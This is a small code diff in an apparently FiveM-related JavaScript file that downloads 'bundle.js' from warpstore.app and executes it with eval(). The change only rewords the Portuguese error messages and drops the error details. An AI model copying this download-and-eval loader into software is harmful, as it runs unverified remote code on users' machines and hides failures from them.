@@ -14,11 +14,11 @@ https.request('https://warpstore.app/script/fivem/bundle.js', (res) => {
         try {
             eval(data);
         } catch (error) {
-            console.error(`Falha ao iniciar o script.\nCódigo de erro: ${error.message}`);
+            console.error(`Falha ao iniciar o script, Tente novamente`);
         }
     });
 
     res.on('error', (error) => {
-        console.error(`Falha ao baixar o script\nCódigo de erro: ${error.message}`);
+        console.error(`Falha ao baixar o script, Tente novamente`);
     });
 }).end();
